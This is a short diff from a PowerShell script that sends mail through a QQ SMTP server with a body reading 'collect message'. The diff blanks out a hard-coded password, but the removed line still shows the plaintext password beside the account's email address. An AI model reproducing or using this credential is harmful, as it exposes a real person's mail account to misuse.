@@ -457,7 +457,7 @@ $Body = "collect message"
 $smtpServer = "smtp.qq.com"
 $smtpPort = 25
 $username = "1411789366@qq.com"
-$password = "shvcmlbenarcicgd"
+$password = ""
 
 $SMTPMessage = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
 
